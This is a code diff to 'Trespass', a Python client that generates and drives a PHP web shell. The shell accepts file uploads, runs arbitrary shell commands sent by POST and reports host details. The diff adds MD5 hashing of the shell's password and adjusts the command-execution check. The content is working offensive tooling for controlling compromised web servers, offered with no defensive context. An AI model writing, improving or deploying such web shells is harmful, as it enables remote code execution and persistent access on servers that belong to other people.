@@ -1,6 +1,6 @@
 #import requests
 import requests
-
+import hashlib
 
 #print banner
 print('''___________________    ___ ___  ____ ___  
@@ -12,6 +12,8 @@ print('''___________________    ___ ___  ____ ___
  Trespass Author - TDHU - help from JetBlack''')
 print(" ")
 pa55=input(" pass: ")
+pa55wd = hashlib.md5(pa55.encode())
+pa55wd = pa55wd.hexdigest()
 path=input(" URL of php file: ")
 print(" ")
 treshelp=''' Choose option by number!
@@ -73,7 +75,7 @@ while True:
 $name = $_FILES['file']['name'];
 $tmp_name = $_FILES['file']['tmp_name'];
 $pass = $_POST['pass'];
-if ($pass == "''' + pa55 + '''"){
+if (md5($pass) == "''' + pa55wd + '''"){
     if(isset($name)){
         $location='upload/';
         move_uploaded_file($tmp_name, $location.$name);
@@ -107,7 +109,7 @@ if ($pass == "''' + pa55 + '''"){
         print(" shell closed!")
     elif choice == "11":
         r = requests.post(path, data = { 'pass' : pa55, 'command' : 'echo this_is_an_obsure_string@*^####---++==='})
-        if "echo this_is_an_obsure_string@*^####---++===" in r.text:
+        if "this_is_an_obsure_string@*^####---++===" in r.text:
             print(" you can run shell commands!")
         else:
             print(" unconfirmed!")
@@ -118,7 +120,7 @@ if ($pass == "''' + pa55 + '''"){
         file=open("trespass.php", "w")
         file.write('''<?php
 $pass = $_POST["pass"];
-if ($pass == "''' + pa55 + '''"){
+if (md5($pass) == "''' + pa55wd + '''"){
     $hostdata = $_POST['hostdata'];
     if ($hostdata=="get"){
         echo php_uname();
